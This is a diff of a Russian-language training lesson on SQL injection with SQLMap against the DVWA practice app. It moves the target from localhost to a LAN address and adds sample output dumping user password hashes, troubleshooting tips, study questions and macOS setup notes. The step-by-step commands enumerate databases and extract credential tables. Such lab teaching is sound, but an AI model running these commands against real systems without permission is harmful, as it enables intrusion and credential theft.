@@ -61,7 +61,7 @@
 
 **Шаг 1: Проверка на уязвимость**
 ```bash
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
   --batch
 ```
@@ -70,7 +70,7 @@ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
 
 **Шаг 2: Получение списка баз данных**
 ```bash
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
   --dbs --batch
 ```
@@ -79,7 +79,7 @@ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
 
 **Шаг 3: Получение таблиц в базе dvwa**
 ```bash
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
   -D dvwa --tables --batch
 ```
@@ -88,7 +88,7 @@ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
 
 **Шаг 4: Получение колонок таблицы users**
 ```bash
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
   -D dvwa -T users --columns --batch
 ```
@@ -97,7 +97,7 @@ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
 
 **Шаг 5: Скачивание данных из таблицы users**
 ```bash
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
   -D dvwa -T users --dump --batch
 ```
@@ -109,7 +109,7 @@ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
 Добавьте параметр `--proxy="http://127.0.0.1:8080"`, чтобы видеть запросы SQLMap в Burp Suite.
 
 ```bash
-sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
   --dbs --batch --proxy="http://127.0.0.1:8080"
 ```
@@ -120,7 +120,80 @@ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
 2. **Скриншот 2**: Вывод команды `-D dvwa --tables` — таблицы в dvwa
 3. **Скриншот 3**: Вывод команды `--dump` — данные пользователей
 
+### Примеры вывода SQLMap
+
+**Вывод --dbs:**
+```
+[INFO] fetching databases
+[INFO] fetching tables for 'dvwa'
+[INFO] retrieved: information_schema
+[INFO] retrieved: dvwa
+[INFO] retrieved: mysql
+[INFO] retrieved: performance_schema
+available databases [4]:
+[*] dvwa
+[*] information_schema
+[*] mysql
+[*] performance_schema
+```
+
+**Вывод --dump:**
+```
+Database: dvwa
+Table: users
+[5 entries]
++---------+------------+-----------+-------+----------------------------------+
+| user_id | first_name | last_name | user  | password                         |
++---------+------------+-----------+-------+----------------------------------+
+| 1       | admin      | admin     | admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
+| 2       | Gordon     | Brown     | gordonb | e99a18c428cb38d5f260853678922e03 |
++---------+------------+-----------+-------+----------------------------------+
+```
+
+### Частые ошибки
+
+1. **Неправильные cookie** — без актуальной сессии SQLMap получит страницу логина, а не результат
+2. **Забыли --batch** — SQLMap будет задавать вопросы, ожидая ввода
+3. **Неправильный уровень** — на Medium/High нужен --level 2-5 и --risk 2-3
+4. **GET вместо POST** — для форм нужно использовать --data
+
+### Вопросы на понимание
+
+1. Почему SQLMap нужны cookie сессии для работы с DVWA?
+2. Чем отличается --dbs от --tables, когда нужно указывать -D?
+3. Зачем нужен параметр --batch в автоматизированных скриптах?
+4. Почему SQLMap может не найти уязвимость на уровне Medium?
+
+### Адаптация под macOS (M2)
+
+```bash
+# Установка SQLMap на macOS (M2)
+pip3 install sqlmap
+
+# Или через Homebrew
+brew install sqlmap
+
+# Проверка
+sqlmap --version
+
+# Если cookie содержат спецсимволы, используйте одинарные кавычки
+sqlmap -u "http://192.168.0.x/vulnerabilities/sqli/?id=1" \
+  --cookie 'PHPSESSID=abc123; security=low' \
+  --batch
+```
+
 ---
+
+
+## Адаптация под macOS (M2, 8GB)
+
+- Для установки инструментов используйте Homebrew: `brew install <tool>`
+- На MacBook Air M2 (8GB) запускайте VM с памятью не более 3-4GB
+- Используйте UTM вместо VirtualBox (лучшая поддержка ARM)
+- Docker работает нативно на M2: `docker pull <image>`
+- Для VPN используйте Tunnelblick (OpenVPN) или официальные клиенты
+- Для Python используйте `pip3 install` вместо `pip install`
+
 
 ## Задачи для самостоятельного выполнения
 
@@ -128,7 +201,7 @@ sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
 
 2. **Работа с POST-запросами**: На странице SQL Injection (Blind) в DVWA используется POST-форма. Используйте SQLMap для взлома:
    ```bash
-   sqlmap -u "http://localhost/vulnerabilities/sqli_blind/" \
+   sqlmap -u "http://192.168.0.x/vulnerabilities/sqli_blind/" \
      --data "id=1&Submit=Submit" \
      --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
      --dbs --batch
